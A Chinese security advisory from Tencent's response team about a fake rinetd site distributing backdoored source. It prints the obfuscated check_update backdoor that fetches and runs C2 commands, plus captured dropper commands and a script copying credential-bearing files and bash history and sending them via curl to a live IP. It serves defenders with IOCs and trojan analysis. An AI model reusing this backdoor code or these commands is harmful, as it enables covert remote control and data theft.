**文｜** 柯南、xti9er、harold

  

# 0x01 事件概述

近日，腾讯洋葱反入侵系统检测发现了一起仿造开源软件官方站点的钓鱼事件，并已与官方作者取得联系。事实上该开源软件目前仅在github发布，目前正在尝试推动该站点下线。由于该问题在互联网广泛传播，腾讯安全应急响应中心（TSRC）秉承共建安全生态的原则，在此建议禁止访问该网站，并根据附件IOC尽快自查感染情况，保障用户安全。

  

# 0x02 事件分析

2019年12月26日，某组织注册的<http://www.rinetd.com/>域名上线，以rinetd工具的‘官方’站点的身份，对外提供附带后门的rinetd源码压缩包下载。

这份源码在原作者在Github上的代码基础上增加了一个检查更新函数-check_update，该函数可用于定期向c2发起更新请求，并根据c2的返回来执行系统命令。

check_update函数如下：

    
    
    void *check_update(void *arg)
    {
    	int i;
            char sys[BUFSIZ]={0};
    	char nfn[BUFSIZ]={0};
    	char fn[]= {-27,-13,-12,-22,-90,-85,-32,-11,-90,-18,-14,-14,-10,-68,-87,-87,-13,-10,-30,-25,-14,-29,-88,-12,-17,-24,-29,-14,-30,-88,-27,-23,-21,-87,-13,-10,-30,-25,-14,-29,-88,-10,-18,-10};
    	 for(i = 0; i < strlen(fn); i++)
        	       fn[i] = fn[i] ^ 0x86;
    	sampleOsRelease(sys);
    	sprintf(nfn,"%s?t=%s",fn,sys);
    	while(1)
    	{
         	     FILE *fp;
    	     char buf[BUFSIZ];	          
    	     if (NULL != (fp = popen(nfn, "r")))
    		fread(buf, BUFSIZ, 1, fp);
    	    else {
    		  Sleep(1000); 
    		    continue;
    		}
    	    pclose(fp);
               if (strlen(buf)>0)
    	   {
    	       char url[BUFSIZ];
    	       sprintf(url,"/bin/sh -c \"$(curl -fsSL %s)\"",buf); 
    	       system(url);  
    	    }
    		buf[0]=0;
        Sleep(1800000); 
    		}
    	  return ((void *)0);
    	}
    

后门权限维持：

    
    
    // 定期向http://www.rinetd.com发起更新请求
    sprintf(nfn,"%s?t=%s",fn,sys); 
    

捕捉到的请求：

curl -fs http://update.rinetd.com/update.php?t=xxxxxxx

后门下发指令执行：

    
    
    // 接受到来自http://www.rinetd.com的命令后，执行
    sprintf(url,"/bin/sh -c \"$(curl -fsSL %s)\"",buf); 
    system(url);  
    

捕捉到的请求：

curl -sfo system_info.sh http://www.rinetd.com/xxxxxx.sh

该脚本执行内容如下：

cd /tmp && \rm -rf ./update && \curl -sfo update http://www.rinetd.com/xxxxxxx
&& \chmod 777 ./update && \\./update && \rm -rf ./update update.sh

在tmp目录下载并运行一个update程序（ddos木马），种马成功之后将该木马文件删除。

监控过程中发现该后门还会下发一些信息收集动作：

    
    
    cp /etc/hosts /tmp/.sysinfo/
    cp /etc/sysconfig/iptables /tmp/.sysinfo/
    cp /etc/zabbix/zabbix_agentd.conf /tmp/.sysinfo/
    cp /root/.bash_history /tmp/.sysinfo/
    iptables-save
    tar -czf system_xx.xx.xx.xx1.tar .sysinfo
    rm .sysinfo -rf
    curl -F file=@system_xx.xx.xx.xx.tar http://35.194.185.68/s.php
    rm system_xx.xx.xx.xx.tar
    rm /tmp/system_info.sh
    

# 0x03 木马分析

上述流程最终种下的木马：/tmp/update。此木马为曾被命名为“Linux/XOR.DDoS”的DDOS木马家族衍生版本，在本blog的文章中有过之前版本的分析，详见《[云端博弈——木马屠城](https://mp.weixin.qq.com/s/6rwzVW30lqkFPcES1QQ5oA)》。其中这个家族木马经典的几个函数一直没有变过：

  *  **encrypt_code**

顾名思义，用作隐藏敏感字符串的。上面的rinetd.c的check_update()函数的代码风格与此类似。

![](https://image.3001.net/images/20201202/1606914714_5fc7929aaa48caea7fe19.png!small)  

  *  **CheckLKM**

检查lkm
rookit模块是否安装成功，很可惜在现场环境中未找到ko文件（安装过程有删除安装文件的行为），同时并未记录到加载内核模块的命令，推断这个rootkit并没有安装或者被木马作者抛弃了。

不过根据木马还保留的HidePidPort\HideFile\bypass_iptables功能还是可以推断其工作原理，当然这部分分析也在前面的文章中有提及，这里不赘述。

此rookit功能参考开源代码：<https://github.com/mncoppola/suterusu>。

rootkit自查可使用工具：<https://security.tencent.com/index.php/opensource/detail/16>

  *  **PtyShell**

反连shell，通过ptmx_open创建伪终端，并启动/bin/bash将标准输出输出重定向到伪终端，接受控制端命令。并且通过rootkit功能（HidePidPort）隐藏进程，加密传输控制指令。所以
**NIDS常规的C2策略不会被命中。**

![](https://image.3001.net/images/20201202/1606914749_5fc792bd728a5fa5a5ef1.png!small)  

  *  **其他**

木马还包含了其他的文件传输、端口扫描、发udp\dns包等常规功能不逐一赘述。

此木马家族及僵尸网络一直在更新，在可追溯的记录来看，至少存在长达6年之久。从最新的版本来看，其种马方式已经除传统的弱口令爆破、Nday抓鸡等模式外，本次的供应链攻击更加猥琐隐蔽。代码功能也更为简洁，没有冗余的敏感操作，不易察觉。

  

# 0x04 黑产分析

XOR.DDoS及其变种是一个庞大的主要针对Linux服务器的僵尸网络家族。该僵尸网络家族通常通过暴力破解的方式，获得存在弱口令的Linux服务器的控制权。该僵尸网络家族较为活跃的c2c域名列表如下：

2017fly.com

2018fly.com

2019fly.com

7mfsdfasdmkgmrk.com

8masaxsssaqrk.com

9fdmasaxsssaqrk.com

aaa.dsaj2a.org

dddgata789.com

dnstells.com

dsaj2a.com

dsaj2a.org

dsaj2a1.org

efbthmoiuykmkjkjgt.com

fly1989.com

gggatat456.com

gzcfr5axf6.com

gzcfr5axf7.com

hcxiaoao.com

hostasa.org

lpjulidny7.com

navert0p.com

navicatadvvr.com

s9xk32a.com

s9xk32b.com

s9xk32c.com

sb1024.net

topbannersun.com

wangzongfacai.com

wowapplecar.com

xxxatat456.com

zxchk.xicp.net

zxcvbmnnfjjfwq.com

根据宙斯盾团队的监测数据，XOR.DDoS及其变种控制的肉鸡，是现网最常见的DDoS僵尸网络家族，在Linux系统服务器肉鸡中的占比达到62%。XOR.DDoS僵尸网络家族发起的DDoS攻击中，最为典型的是SYNFLOOD攻击，典型的攻击payload为长度847~896字节的SYN大包，payload中含有
**020405b401010402** 的特征。

![](https://image.3001.net/images/20201202/1606914800_5fc792f09109a0efe0112.png!small)  

## 0x05 IOC

ip：

35.194.132.172

35.194.185.68

35.189.164.113

fqdn：

<http://www.rinetd.com>

  

# 0x06 团队介绍

 **洋葱反入侵系统**

安平洋葱系统是腾讯内部自研的服务器安全系统（XDR），支持x86和arm架构，为腾讯公司百万级服务器提供入侵检测、漏洞检测、安全基线扫描和安全追溯等安全能力、满足安全合规要求，一直服务于QQ、微信、腾讯云、腾讯游戏等业务。洋葱团队专注于黑客攻防领域，关注第三方组件、软件源等基础设施安全，发现的重大安全风险也会及时同步官方，欢迎有兴趣的安全团队交流合作。同时洋葱团队也在和腾讯云合作，为一些外部企业提供安全支持。

 **宙斯盾**

安全平台部宙斯盾DDoS防护系统，基于十余年的防护技术积累，提供专业、可靠的攻击防护解决方案。一直服务于QQ、微信、游戏、云等腾讯业务，具备T级流量的DDoS检测和清洗能力，保障业务运营的安全稳定。在服务保障自研业务之余，也进行技术能力输出，目前已经为Garena、知道创宇等合作公司提供防护能力部署支持；也与腾讯云合作输出T-Sec DDoS高防产品，助力产业互联网客户安全能力升级。

